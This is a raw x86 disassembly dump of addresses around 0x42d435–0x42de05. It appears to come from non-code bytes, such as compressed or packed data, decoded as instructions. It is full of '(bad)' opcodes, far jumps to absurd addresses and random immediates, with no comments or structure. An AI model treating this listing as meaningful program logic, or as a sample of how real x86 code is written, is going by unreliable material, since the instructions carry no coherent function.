  42d435:	sbb    ebp,edx
  42d437:	sahf   
  42d438:	cmc    
  42d439:	fsubp  st(7),st
  42d43b:	jnp    0x42d48c
  42d43d:	mov    al,ds:0x7e190781
  42d442:	xchg   esi,eax
  42d443:	leave  
  42d444:	fild   WORD PTR fs:[ecx]
  42d447:	add    dh,dh
  42d449:	add    BYTE PTR [eax],al
  42d44b:	add    BYTE PTR [ecx],dh
  42d44d:	(bad)  
  42d44e:	aas    
  42d44f:	pushf  
  42d450:	js     0x42d46f
  42d452:	repz stc 
  42d454:	or     DWORD PTR [ecx+0x5e],ebp
  42d457:	in     al,0x82
  42d459:	scas   al,BYTE PTR es:[edi]
  42d45a:	ja     0x42d43b
  42d45c:	xchg   ch,bh
  42d45e:	das    
  42d45f:	sbb    DWORD PTR [esi],ebp
  42d461:	adc    edi,esp
  42d463:	ins    DWORD PTR es:[edi],dx
  42d464:	hlt    
  42d465:	dec    ebx
  42d466:	add    al,0x57
  42d468:	and    DWORD PTR [edi],esp
  42d46a:	pushf  
  42d46b:	fs ds je 0x42d434
  42d46f:	neg    bh
  42d471:	retf   0xe7e9
  42d474:	push   ecx
  42d475:	inc    eax
  42d476:	pop    ds
  42d477:	push   esi
  42d478:	xchg   edx,eax
  42d479:	arpl   WORD PTR [esi],cx
  42d47b:	(bad)  
  42d47c:	jae    0x42d4c3
  42d47e:	(bad)  
  42d47f:	push   0x20
  42d481:	outs   dx,BYTE PTR ds:[esi]
  42d482:	dec    edx
  42d483:	call   0x67bb:0xc97f261e
  42d48a:	push   0x4b
  42d48c:	dec    ecx
  42d48d:	or     DWORD PTR [edi+0x5b],ebx
  42d490:	pushf  
  42d491:	sbb    dl,BYTE PTR [esi]
  42d493:	sub    BYTE PTR [ebx-0x7b],ch
  42d496:	cmc    
  42d497:	pushf  
  42d498:	cld    
  42d499:	rol    BYTE PTR [ecx-0x6a698fe5],cl
  42d49f:	dec    esi
  42d4a0:	daa    
  42d4a1:	cmp    DWORD PTR ds:0x24e56119,edi
  42d4a7:	inc    esp
  42d4a8:	inc    ebp
  42d4a9:	out    0x11,al
  42d4ab:	rol    BYTE PTR ds:0x9179d46f,cl
  42d4b1:	or     edx,esi
  42d4b3:	jmp    0xf28a1bd3
  42d4b8:	add    eax,0x2cdedd65
  42d4bd:	jne    0x42d43f
  42d4bf:	or     dl,BYTE PTR [ebp-0x696be6c9]
  42d4c5:	scas   eax,DWORD PTR es:[edi]
  42d4c6:	in     eax,0x6d
  42d4c8:	mov    esp,0xd486d961
  42d4cd:	xchg   ebx,eax
  42d4ce:	mov    esi,0x346b085c
  42d4d3:	inc    esi
  42d4d4:	out    dx,eax
  42d4d5:	xor    ch,al
  42d4d7:	cli    
  42d4d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d4d9:	cdq    
  42d4da:	add    ebx,DWORD PTR [eax]
  42d4dc:	or     ch,BYTE PTR [eax]
  42d4de:	pop    ecx
  42d4df:	xchg   esi,eax
  42d4e0:	lea    esi,[ebx-0x1488643f]
  42d4e6:	mov    edi,0x1578064a
  42d4eb:	adc    esp,DWORD PTR [edi-0x38c85cc9]
  42d4f1:	inc    ecx
  42d4f2:	loopne 0x42d561
  42d4f4:	sub    eax,0x9457253b
  42d4f9:	push   esp
  42d4fa:	ja     0x42d543
  42d4fc:	lods   eax,DWORD PTR ds:[esi]
  42d4fd:	push   cs
  42d4fe:	and    dl,dh
  42d500:	mov    ebx,0xb539ab77
  42d505:	loop   0x42d57f
  42d507:	outs   dx,DWORD PTR ds:[esi]
  42d508:	mov    ds:0x5b961a0d,al
  42d50d:	call   0x508d:0xb984d1fc
  42d514:	or     al,0x4d
  42d516:	cmp    DWORD PTR [esi+0x707ef0fa],esi
  42d51c:	sbb    ecx,DWORD PTR [ecx]
  42d51e:	inc    esi
  42d51f:	add    al,0xc0
  42d521:	xchg   edi,eax
  42d522:	nop
  42d523:	pop    edi
  42d524:	call   0x20490a23
  42d529:	cmp    ecx,DWORD PTR [ebx]
  42d52b:	call   0x828b399b
  42d530:	and    al,0xdd
  42d532:	fbstp  TBYTE PTR [eax]
  42d534:	sbb    ch,BYTE PTR [ebx]
  42d536:	sbb    eax,0xd1e59493
  42d53b:	mov    dl,0xe4
  42d53d:	mov    al,ds:0xdb26192e
	...
  42d5b2:	add    BYTE PTR [eax],al
  42d5b4:	pop    ebp
  42d5b5:	dec    eax
  42d5b6:	jle    0x42d546
  42d5b8:	jg     0x42d578
  42d5ba:	std    
  42d5bb:	fld    TBYTE PTR [edi]
  42d5bd:	cmp    BYTE PTR [ebp-0x50],bl
  42d5c0:	sbb    al,0xbc
  42d5c3:	and    ebx,DWORD PTR [edx-0x20]
  42d5c6:	add    DWORD PTR [eax],eax
  42d5c8:	test   BYTE PTR [eax],0x0
  42d5cb:	add    BYTE PTR [edx+0x44],ch
  42d5ce:	or     al,BYTE PTR [edi+eax*8-0x341fd98d]
  42d5d5:	shl    BYTE PTR [edi+0x63],0x18
  42d5d9:	js     0x42d5d8
  42d5db:	cmp    ah,BYTE PTR [eax+0x3e]
  42d5de:	xor    eax,0xbdb82870
  42d5e3:	stos   DWORD PTR es:[edi],eax
  42d5e4:	dec    ecx
  42d5e5:	xor    eax,esp
  42d5e7:	std    
  42d5e8:	pop    ebp
  42d5e9:	je     0x42d632
  42d5eb:	in     eax,dx
  42d5ec:	(bad)  
  42d5ed:	retf   
  42d5ee:	push   edx
  42d5ef:	fiadd  DWORD PTR [ebp+0x5c]
  42d5f2:	inc    eax
  42d5f3:	push   eax
  42d5f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d5f5:	fsubr  DWORD PTR ds:0x5261e532
  42d5fb:	and    esi,0x32
  42d5fe:	fs int3 
  42d600:	fisubr DWORD PTR [edx]
  42d602:	fs (bad) 
  42d604:	jmp    0x42d65a
  42d606:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d607:	retf   
  42d608:	mov    al,ds:0x4d75ccdf
  42d60d:	stc    
  42d60e:	lods   eax,DWORD PTR ds:[esi]
  42d60f:	nop
  42d610:	add    al,0x1c
  42d612:	pop    ss
  42d613:	(bad)  
  42d614:	and    ebp,edi
  42d616:	pushf  
  42d617:	outs   dx,BYTE PTR ds:[esi]
  42d618:	jecxz  0x42d60c
  42d61a:	xor    cl,BYTE PTR [esi+0x61]
  42d61d:	leave  
  42d61e:	push   0x9d64d617
  42d623:	mov    edx,ebx
  42d625:	rcl    bl,0xc4
  42d628:	fwait
  42d629:	or     eax,0xcf2576bf
  42d62e:	push   eax
  42d62f:	bound  ebx,QWORD PTR [edi-0x6a]
  42d632:	stos   BYTE PTR es:[edi],al
  42d633:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d635:	sbb    dl,BYTE PTR [edi]
  42d637:	or     BYTE PTR [esi-0x1a923cf6],dl
  42d63d:	sti    
  42d63e:	and    eax,0x4b540e84
  42d643:	ss mov dh,0xf2
  42d646:	jge    0x42d6ba
  42d648:	and    al,0x6f
  42d64a:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  42d64c:	xor    eax,0x753fd8b9
  42d651:	cdq    
  42d652:	ss inc esi
  42d654:	stos   BYTE PTR es:[edi],al
  42d655:	mov    edx,0x74420768
  42d65a:	add    BYTE PTR gs:[esi],dh
  42d65d:	into   
  42d65e:	sub    bl,BYTE PTR [esi-0x43]
  42d661:	repz add BYTE PTR [edi+ebx*8],dh
  42d665:	ss iret 
  42d667:	das    
  42d668:	mov    esi,gs
  42d66a:	pop    ds
  42d66b:	xchg   edx,eax
  42d66c:	mov    bl,0x49
  42d66e:	out    0x33,al
  42d670:	xchg   esp,eax
  42d671:	inc    esi
  42d672:	mov    esi,0x8b357240
  42d677:	or     al,0x1
  42d679:	dec    BYTE PTR [eax-0x56be2149]
  42d67f:	mov    ah,BYTE PTR [edi+0x387c3860]
  42d685:	lock data16 repnz arpl cx,ax
  42d68a:	out    0xc3,eax
  42d68c:	mov    dh,0x62
  42d68e:	or     eax,0xa26c2f16
  42d693:	shl    DWORD PTR [edi+0x74d833f8],cl
  42d699:	add    dh,cl
  42d69b:	pop    eax
  42d69c:	sbb    eax,0x3051493a
  42d6a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d6a2:	mov    esi,0xcf020ad7
  42d6a7:	inc    ecx
  42d6a8:	lock aam 0xdb
  42d6ab:	shl    DWORD PTR [edi+edi*1+0x5df78154],0xcb
  42d6b3:	mov    dl,0xa1
  42d6b5:	imul   ebx,DWORD PTR [eax-0x6e],0xffffff8f
  42d6b9:	add    BYTE PTR [esi-0x4a],0xd7
  42d6bd:	into   
  42d6be:	mov    dl,0x96
  42d6c0:	inc    edi
  42d6c1:	jnp    0x42d6c3
	...
  42d733:	add    BYTE PTR [eax],bh
  42d735:	mov    DWORD PTR [edx-0x6b],ebp
  42d738:	sti    
  42d739:	idiv   edi
  42d73b:	lods   eax,DWORD PTR ds:[esi]
  42d73c:	jne    0x42d70c
  42d73e:	adc    al,0x87
  42d740:	daa    
  42d741:	dec    ecx
  42d742:	idiv   esp
  42d744:	push   eax
  42d745:	loope  0x42d748
  42d747:	add    dh,dh
  42d749:	add    BYTE PTR [eax],al
  42d74b:	add    ch,bh
  42d74d:	in     al,0xc7
  42d74f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d750:	ja     0x42d7cb
  42d752:	jl     0x42d76e
  42d754:	adc    BYTE PTR [ebp+0x6f],dh
  42d757:	(bad)  
  42d758:	(bad)  
  42d759:	sbb    DWORD PTR [eax+0x72],esi
  42d75c:	adc    esi,eax
  42d75e:	cmc    
  42d75f:	ss push eax
  42d761:	xor    al,0xaa
  42d763:	mov    bh,0xd1
  42d765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d766:	arpl   si,ax
  42d768:	sahf   
  42d769:	mov    WORD PTR [esi-0x51],fs
  42d76c:	sbb    BYTE PTR [eax],bh
  42d76e:	jle    0x42d778
  42d770:	arpl   cx,di
  42d772:	retf   0xe523
  42d775:	test   BYTE PTR [esi],dh
  42d777:	pop    edx
  42d778:	repnz imul ecx,DWORD PTR [eax+edx*2],0x54
  42d77d:	xchg   ecx,eax
  42d77e:	fadd   QWORD PTR [ebx]
  42d780:	fistp  DWORD PTR [edi+0x16267d1b]
  42d786:	popa   
  42d787:	xor    eax,0x9a48a139
  42d78c:	fstp   DWORD PTR [edx+0x59]
  42d78f:	je     0x42d7ca
  42d791:	loop   0x42d792
  42d793:	mov    edi,esi
  42d795:	(bad)  
  42d796:	out    0x13,eax
  42d798:	sahf   
  42d799:	mov    al,0x80
  42d79b:	adc    DWORD PTR [edi],ebx
  42d79d:	mov    ah,0x26
  42d79f:	mov    dh,0xf1
  42d7a1:	ret    
  42d7a2:	(bad)  
  42d7a3:	or     esi,DWORD PTR [ebx]
  42d7a5:	popa   
  42d7a6:	jo     0x42d762
  42d7a8:	jnp    0x42d7ed
  42d7aa:	fsub   QWORD PTR [ebx-0x48]
  42d7ad:	xchg   edi,eax
  42d7ae:	data16 or al,0x82
  42d7b1:	pop    ebx
  42d7b2:	retf   0x7427
  42d7b5:	mov    al,0x9
  42d7b7:	xchg   ebx,eax
  42d7b8:	daa    
  42d7b9:	in     al,dx
  42d7ba:	cld    
  42d7bb:	add    al,0x1a
  42d7bd:	fild   QWORD PTR [esi-0x64dbd3e5]
  42d7c3:	dec    esp
  42d7c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d7c5:	pop    DWORD PTR ss:[eax+0xc]
  42d7c9:	xor    BYTE PTR [edx-0x70],ch
  42d7cc:	loopne 0x42d78f
  42d7ce:	not    esp
  42d7d0:	ins    BYTE PTR es:[edi],dx
  42d7d1:	pop    esp
  42d7d2:	cmp    DWORD PTR [ebx-0x6a8367cb],0xffffffb0
  42d7d9:	ds sub esp,ebx
  42d7dc:	call   0x22d0:0xf59e1779
  42d7e3:	test   esp,eax
  42d7e5:	dec    BYTE PTR [ecx+ebp*8+0x46089214]
  42d7ec:	cmp    DWORD PTR [ebx+ecx*8+0x2c954ab],edi
  42d7f3:	and    DWORD PTR [esi],0xffffffae
  42d7f6:	cld    
  42d7f7:	stos   BYTE PTR es:[edi],al
  42d7f8:	jne    0x42d7be
  42d7fa:	mov    edx,0xe21fedae
  42d7ff:	not    DWORD PTR [ebp+0xfbb3780]
  42d805:	sbb    ecx,ecx
  42d807:	jle    0x42d828
  42d809:	adc    al,0xa2
  42d80b:	lahf   
  42d80c:	cmp    cl,al
  42d80e:	adc    esi,ecx
  42d810:	mov    cl,0x30
  42d812:	mov    eax,ds:0xcadb08c3
  42d817:	je     0x42d830
  42d819:	cmp    BYTE PTR [edx-0x66],dh
  42d81c:	mov    ch,0xdf
  42d81e:	xchg   ebx,eax
  42d81f:	and    eax,0x606f4a63
  42d824:	mov    edx,0xc3eb8531
  42d829:	ret    0x47a
  42d82c:	and    BYTE PTR [ebp-0x5753276d],dl
  42d832:	xchg   edi,eax
  42d833:	fcomi  st,st(6)
  42d835:	xchg   edi,eax
  42d836:	fcomp  QWORD PTR [ecx]
  42d838:	mov    ds,WORD PTR [ebx+0x2fcee921]
  42d83e:	jbe    0x42d81a
  42d840:	sub    BYTE PTR [ecx+0x0],bh
	...
  42d8b2:	add    BYTE PTR [eax],al
  42d8b4:	adc    BYTE PTR [ebx],bl
  42d8b6:	leave  
  42d8b7:	jmp    0xfb73d487
  42d8bc:	mov    edx,0xf8dcc254
  42d8c1:	retf   
  42d8c2:	sub    edx,DWORD PTR [ebp+0x1e246]
  42d8c8:	test   BYTE PTR [eax],0x0
  42d8cb:	add    BYTE PTR [eax],ah
  42d8cd:	dec    bh
  42d8cf:	mov    eax,ds:0xdac9b8ee
  42d8d4:	ja     0x42d92a
  42d8d6:	mov    ecx,0x50935bb7
  42d8dc:	xchg   DWORD PTR [ebx*4-0x608e458b],eax
  42d8e3:	add    DWORD PTR [ebx],ebp
  42d8e5:	or     edx,DWORD PTR [edi+0x37]
  42d8e8:	pusha  
  42d8e9:	in     al,dx
  42d8ea:	xor    al,0x9e
  42d8ec:	cmp    BYTE PTR [ebp-0x2],dl
  42d8ef:	fdivr  st(0),st
  42d8f1:	scas   al,BYTE PTR es:[edi]
  42d8f2:	inc    ebx
  42d8f3:	int3   
  42d8f4:	xchg   ebp,eax
  42d8f5:	cmp    eax,0x7e31f0e1
  42d8fa:	(bad)  
  42d8fb:	xor    eax,0x5adf7f31
  42d900:	pop    ss
  42d901:	lea    eax,[eax-0x40]
  42d904:	ficom  WORD PTR ss:[eax+ebp*8]
  42d908:	mov    ?,WORD PTR [esi*4-0x7ea9123]
  42d90f:	fsub   DWORD PTR [eax]
  42d911:	les    eax,FWORD PTR [ebx-0x33]
  42d914:	rol    dl,0x75
  42d917:	pop    esp
  42d918:	iret   
  42d919:	retf   0x996e
  42d91c:	ror    BYTE PTR [eax+ebx*1+0x4f],cl
  42d920:	ins    BYTE PTR es:[edi],dx
  42d921:	sub    DWORD PTR [esi-0x16e393b5],0xd11ccfba
  42d92b:	sub    dl,BYTE PTR [edx]
  42d92d:	mov    esi,DWORD PTR [esi+0x60179245]
  42d933:	imul   ecx,DWORD PTR [edx+0xb],0xfffffff1
  42d937:	loope  0x42d978
  42d939:	stos   DWORD PTR es:[edi],eax
  42d93a:	and    DWORD PTR [ebx],0xf
  42d93d:	and    bh,BYTE PTR [ecx]
  42d93f:	idiv   ebx
  42d941:	jo     0x42d900
  42d943:	mov    eax,ds:0xf2d2961c
  42d948:	cmp    al,0x45
  42d94a:	stc    
  42d94b:	or     BYTE PTR [edi],dl
  42d94d:	or     al,0x7e
  42d94f:	cmp    al,0x9e
  42d951:	add    bh,BYTE PTR ds:0xc34179ef
  42d957:	ds pop ds
  42d959:	inc    edx
  42d95a:	loopne 0x42d959
  42d95c:	xor    ch,al
  42d95e:	pop    ds
  42d95f:	sbb    cl,BYTE PTR ds:[ecx-0x41892f07]
  42d966:	xor    edx,eax
  42d968:	sbb    al,0x3b
  42d96a:	and    dl,cl
  42d96c:	iret   
  42d96d:	or     BYTE PTR [edi+ebp*8+0x64],bh
  42d971:	lods   eax,DWORD PTR ds:[esi]
  42d972:	jae    0x42d9a4
  42d974:	enter  0xe757,0xeb
  42d978:	jmp    0x3c0e:0xd19cc7e8
  42d97f:	clc    
  42d980:	gs adc edx,ebx
  42d983:	dec    esp
  42d984:	cld    
  42d985:	pop    esi
  42d986:	sbb    DWORD PTR [ebx],0x94a64c27
  42d98c:	pop    DWORD PTR [esi+0x40372206]
  42d992:	dec    edi
  42d993:	jp     0x42da12
  42d995:	mov    ecx,0xbf54cdf5
  42d99a:	add    dl,cl
  42d99c:	sub    BYTE PTR [esi+0x3f],ah
  42d99f:	ret    0xca5a
  42d9a2:	and    al,0x7a
  42d9a4:	push   0x10
  42d9a6:	mov    esi,0x12f3900a
  42d9ab:	in     al,dx
  42d9ac:	out    dx,eax
  42d9ad:	int3   
  42d9ae:	hlt    
  42d9af:	push   es
  42d9b0:	mov    esi,0x75f9f332
  42d9b5:	push   ebp
  42d9b6:	and    DWORD PTR [esi],ecx
  42d9b8:	imul   eax,ebp,0xeca01eee
  42d9be:	jp     0x42da31
  42d9c0:	and    al,0x8d
	...
  42da32:	add    BYTE PTR [eax],al
  42da34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da35:	fimul  DWORD PTR [eax-0x10ac02bf]
  42da3b:	(bad)  
  42da3c:	jp     0x42da02
  42da3e:	dec    edi
  42da3f:	(bad)  
  42da40:	popa   
  42da41:	in     eax,0x65
  42da43:	sub    al,0x3c
  42da45:	jecxz  0x42da48
  42da47:	add    dh,dh
  42da49:	add    BYTE PTR [eax],al
  42da4b:	add    BYTE PTR [ebp+0x1e],bh
  42da4e:	xchg   ebx,eax
  42da4f:	test   eax,0xcd730905
  42da54:	add    ebx,ebx
  42da56:	mov    bh,0xbc
  42da58:	xor    eax,DWORD PTR [edi-0x29ba9268]
  42da5e:	fsubr  DWORD PTR [edx-0x1d]
  42da61:	sub    al,0xbc
  42da63:	push   eax
  42da64:	stos   DWORD PTR es:[edi],eax
  42da65:	dec    ebx
  42da66:	mov    ecx,DWORD PTR [eax+ebx*4]
  42da69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da6a:	leave  
  42da6b:	cdq    
  42da6c:	cmp    dl,BYTE PTR [esi+0x3147dde8]
  42da72:	ja     0x42da93
  42da74:	pusha  
  42da75:	or     DWORD PTR [ebp+0x10],edi
  42da78:	cld    
  42da79:	sbb    BYTE PTR [ecx-0x26f0b96],dh
  42da7f:	retf   
  42da80:	mov    DWORD PTR gs:[ebp+0x7e],ebx
  42da84:	stos   BYTE PTR es:[edi],al
  42da85:	out    dx,al
  42da86:	std    
  42da87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da88:	jb     0x42da0e
  42da8a:	imul   DWORD PTR [eax-0x290fb1e5]
  42da90:	ins    BYTE PTR es:[edi],dx
  42da91:	fistp  DWORD PTR [edi]
  42da93:	xchg   DWORD PTR [ebx+0x70],esi
  42da96:	test   al,0x7d
  42da98:	pushf  
  42da99:	adc    al,0x3c
  42da9b:	stc    
  42da9c:	dec    edx
  42da9d:	mov    dl,0x34
  42da9f:	pop    ebx
  42daa0:	jns    0x42da5b
  42daa2:	pushf  
  42daa3:	add    ah,ah
  42daa5:	sbb    BYTE PTR [eax-0x2695ae18],cl
  42daab:	jl     0x42da66
  42daad:	push   edi
  42daae:	sbb    DWORD PTR cs:[esi-0x5145476e],esi
  42dab5:	mov    esi,0x8d622d39
  42daba:	dec    esi
  42dabb:	and    ebp,DWORD PTR [ecx-0x4727579]
  42dac1:	dec    edx
  42dac2:	jl     0x42da51
  42dac4:	jns    0x42dad5
  42dac6:	sub    al,0xba
  42dac8:	pop    esi
  42dac9:	inc    esp
  42daca:	jb     0x42db29
  42dacc:	jmp    0xb8c3:0xb8cac88e
  42dad3:	jl     0x42db16
  42dad5:	out    dx,al
  42dad6:	cli    
  42dad7:	(bad)  
  42dad8:	das    
  42dad9:	repnz mov esp,DWORD PTR [ecx-0x41]
  42dadd:	out    dx,eax
  42dade:	in     al,0x2b
  42dae0:	addr16 pop edx
  42dae2:	aad    0xe2
  42dae4:	sar    al,cl
  42dae6:	dec    ecx
  42dae7:	and    eax,0x6180d7c
  42daec:	popf   
  42daed:	add    eax,0x4747a9fd
  42daf2:	and    dl,dh
  42daf4:	add    BYTE PTR [ebp+0x79],dl
  42daf7:	inc    ebx
  42daf8:	jo     0x42daf8
  42dafa:	cs aas 
  42dafc:	sti    
  42dafd:	mov    al,0x4e
  42daff:	push   eax
  42db00:	sub    eax,0x67d741c2
  42db05:	pop    ss
  42db06:	jmp    0xefe3bd48
  42db0b:	dec    edx
  42db0c:	jg     0x42dae6
  42db0e:	les    ecx,FWORD PTR ds:[edi]
  42db11:	jns    0x42db7d
  42db13:	repz xchg ebx,eax
  42db15:	shl    esp,0xa5
  42db18:	ss sub bl,dl
  42db1b:	stos   DWORD PTR es:[edi],eax
  42db1c:	mov    BYTE PTR [eax],bl
  42db1e:	stc    
  42db1f:	cmc    
  42db20:	sahf   
  42db21:	in     eax,dx
  42db22:	cli    
  42db23:	rol    BYTE PTR [edi+ebp*4-0x4ee25073],1
  42db2a:	js     0x42dae8
  42db2c:	pop    ebx
  42db2d:	xrelease mov BYTE PTR [edi],al
  42db30:	scas   al,BYTE PTR es:[edi]
  42db31:	cs repz pop esp
  42db34:	(bad)  
  42db35:	pop    edi
  42db36:	push   edi
  42db37:	xchg   ebx,eax
  42db38:	in     eax,dx
  42db39:	mov    al,0x44
  42db3b:	ins    DWORD PTR es:[edi],dx
  42db3c:	mov    al,0xd0
  42db3e:	mov    ebx,0x297b59
	...
  42dbb3:	add    BYTE PTR [edi+0x2],bh
  42dbb6:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42dbba:	call   FWORD PTR [ebx]
  42dbbc:	(bad)  
  42dbbd:	mov    fs:0x4fdd1037,al
  42dbc3:	or     eax,0x1e432
  42dbc8:	test   BYTE PTR [eax],0x0
  42dbcb:	add    BYTE PTR [edx+0x10],ch
  42dbce:	pop    esi
  42dbcf:	imul   esp,DWORD PTR [eax-0x598dc350],0x9e3419ac
  42dbd9:	jg     0x42dc53
  42dbdb:	imul   ecx,DWORD PTR [eax+ecx*2+0x43],0xb51e5d02
  42dbe3:	mov    edi,0x93c93621
  42dbe8:	push   ebx
  42dbe9:	mov    dh,0xd5
  42dbeb:	mov    ds:0xbea8a974,al
  42dbf0:	cmp    eax,0x68bfa6e6
  42dbf6:	mov    DWORD PTR [edi+esi*2+0x5e],0x7b767b7f
  42dbfe:	and    edi,ecx
  42dc00:	inc    edi
  42dc01:	sbb    ebp,esp
  42dc03:	ins    DWORD PTR es:[edi],dx
  42dc04:	sub    al,0xf6
  42dc06:	push   esi
  42dc07:	fcomp  DWORD PTR [ecx+ebp*1-0x66]
  42dc0b:	xchg   esp,eax
  42dc0c:	retf   
  42dc0d:	mov    bl,BYTE PTR [ebp-0x51]
  42dc10:	inc    edi
  42dc11:	cmp    cl,0x77
  42dc14:	sbb    ah,BYTE PTR [eax-0x4e6ccf76]
  42dc1a:	push   0x3eab7630
  42dc1f:	lods   eax,DWORD PTR ds:[esi]
  42dc20:	adc    bl,al
  42dc22:	(bad)  
  42dc23:	aas    
  42dc24:	rcl    DWORD PTR [ecx],1
  42dc26:	ficomp WORD PTR [ebx]
  42dc28:	rcl    DWORD PTR [esi],0xf9
  42dc2b:	fs call 0xd1c67909
  42dc31:	div    BYTE PTR [ebp-0x67]
  42dc34:	cmp    BYTE PTR [edi],dl
  42dc36:	fbld   TBYTE PTR [ecx-0x53b9ea8e]
  42dc3c:	jnp    0x42dc8c
  42dc3e:	cwde   
  42dc3f:	mov    esp,0xb1aef213
  42dc44:	(bad)  
  42dc45:	push   esi
  42dc46:	push   ebp
  42dc47:	add    edx,edx
  42dc49:	and    eax,0xb221e2cf
  42dc4e:	(bad)  
  42dc4f:	mov    ?,eax
  42dc51:	std    
  42dc52:	pop    esp
  42dc53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc54:	adc    BYTE PTR [ebx],bh
  42dc56:	jbe    0x42dbf6
  42dc58:	push   es
  42dc59:	aam    0x28
  42dc5b:	jle    0x42dcbd
  42dc5d:	xchg   edi,eax
  42dc5e:	xchg   ecx,eax
  42dc5f:	ja     0x42dc86
  42dc61:	arpl   di,dx
  42dc63:	jmp    0x42dc08
  42dc65:	sub    ecx,DWORD PTR [eax-0x4]
  42dc68:	jno    0x42dc54
  42dc6a:	aaa    
  42dc6b:	data16 and BYTE PTR [ecx],dh
  42dc6e:	cmc    
  42dc6f:	inc    ebp
  42dc70:	pop    esp
  42dc71:	add    BYTE PTR [ebp+0x5fcdd566],cl
  42dc77:	inc    edx
  42dc78:	adc    al,0xf0
  42dc7a:	xor    dl,BYTE PTR [eax-0x36]
  42dc7d:	test   BYTE PTR [esi+ebx*2],0xdb
  42dc81:	mov    bl,0xe
  42dc83:	add    al,0x2b
  42dc85:	dec    ecx
  42dc86:	outs   dx,DWORD PTR ds:[esi]
  42dc87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc88:	fwait
  42dc89:	add    eax,edx
  42dc8b:	mov    dl,0x9d
  42dc8d:	sub    esi,esi
  42dc8f:	imul   edx,esi,0xfffffffc
  42dc92:	addr16 pushf 
  42dc94:	mov    al,ds:0x3b68878c
  42dc99:	out    dx,eax
  42dc9a:	aam    0x6
  42dc9c:	xlat   BYTE PTR ds:[ebx]
  42dc9d:	ret    0x7239
  42dca0:	and    ebx,DWORD PTR [ecx]
  42dca2:	or     eax,DWORD PTR [ecx+0x93f4300]
  42dca8:	aas    
  42dca9:	push   ebp
  42dcaa:	mov    ebp,0x36219f6a
  42dcaf:	lea    edx,[edx]
  42dcb1:	loopne 0x42dcf1
  42dcb3:	pop    ecx
  42dcb4:	jge    0x42dcc0
  42dcb6:	sub    cl,cl
  42dcb8:	out    dx,eax
  42dcb9:	mov    esp,0x90d10988
  42dcbe:	add    eax,0x3fe23d
	...
  42dd33:	add    BYTE PTR [ecx],bl
  42dd35:	mov    eax,ds:0xdffe87fe
  42dd3a:	jns    0x42dcfb
  42dd3c:	daa    
  42dd3d:	data16 fnstsw WORD PTR [ecx-0x1da60c67]
  42dd44:	sub    ch,ah
  42dd46:	add    DWORD PTR [eax],eax
  42dd48:	test   BYTE PTR [eax],0x0
  42dd4b:	add    BYTE PTR [esi+0x2e],bl
  42dd4e:	or     DWORD PTR [ecx+ecx*8-0x6bea843b],esi
  42dd55:	(bad)
  42dd5a:	pop    ecx
  42dd5b:	stos   BYTE PTR es:[edi],al
  42dd5c:	test   DWORD PTR [esi+0x16],edi
  42dd5f:	out    0x6,al
  42dd61:	dec    eax
  42dd62:	(bad)  
  42dd63:	pop    ss
  42dd64:	cmp    dh,BYTE PTR [ebp+ecx*4-0x48d7123f]
  42dd6b:	das    
  42dd6c:	pop    es
  42dd6d:	sbb    DWORD PTR [edx-0x1c],eax
  42dd70:	add    ch,ch
  42dd72:	shl    ecx,1
  42dd74:	dec    edi
  42dd75:	test   eax,0x357b1508
  42dd7a:	lock scas al,BYTE PTR es:[edi]
  42dd7c:	les    esp,FWORD PTR [edi-0x2b]
  42dd7f:	pop    ebx
  42dd80:	pop    ss
  42dd81:	or     DWORD PTR [ecx+0x7f],0xffffffa2
  42dd85:	shr    BYTE PTR [eax+ebx*8+0x27],0x96
  42dd8a:	ror    DWORD PTR [esi],cl
  42dd8c:	adc    DWORD PTR [eax+eiz*1],ebx
  42dd8f:	or     ebx,DWORD PTR [edx+0x24]
  42dd92:	pop    ds
  42dd93:	pop    ecx
  42dd94:	lods   al,BYTE PTR ds:[esi]
  42dd95:	cdq    
  42dd96:	sub    al,0x41
  42dd98:	mov    DWORD PTR [edi],esi
  42dd9a:	ret    0x3646
  42dd9d:	int    0x3b
  42dd9f:	in     al,dx
  42dda0:	pusha  
  42dda1:	test   al,0x26
  42dda3:	sbb    al,0x5f
  42dda5:	push   edx
  42dda6:	push   ds
  42dda7:	mov    eax,0xa3cfd43c
  42ddac:	(bad)  
  42ddad:	in     al,dx
  42ddae:	and    eax,0xfc601c2
  42ddb3:	xchg   edi,eax
  42ddb4:	shl    DWORD PTR [ebp-0x1],cl
  42ddb7:	mov    edi,0x70e5a384
  42ddbc:	or     eax,0xc010c66
  42ddc1:	push   ss
  42ddc2:	ds pop edx
  42ddc4:	stos   DWORD PTR es:[edi],eax
  42ddc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ddc6:	shl    eax,0xa0
  42ddc9:	add    ebp,esp
  42ddcb:	loope  0x42ddc3
  42ddcd:	dec    ecx
  42ddce:	adc    DWORD PTR [edx-0x2f8aac1],ebp
  42ddd4:	repnz mov edx,0x39fa9d78
  42ddda:	pop    eax
  42dddb:	inc    ebx
  42dddc:	call   0x2dea6908
  42dde1:	js     0x42de27
  42dde3:	pop    edi
  42dde4:	fstp   DWORD PTR [ebp+0x5]
  42dde7:	jmp    0x4dc353c
  42ddec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dded:	cdq    
  42ddee:	imul   ecx,DWORD PTR [ecx-0x3e],0xffffff87
  42ddf2:	cmp    al,0xa5
  42ddf4:	outs   dx,DWORD PTR ds:[esi]
  42ddf5:	scas   eax,DWORD PTR es:[edi]
  42ddf6:	popf   
  42ddf7:	int    0xa
  42ddf9:	sub    DWORD PTR [ebp+0x156a0c6f],edx
  42ddff:	xor    ch,BYTE PTR [edx+0x6dba57be]
  42de05:	iret   
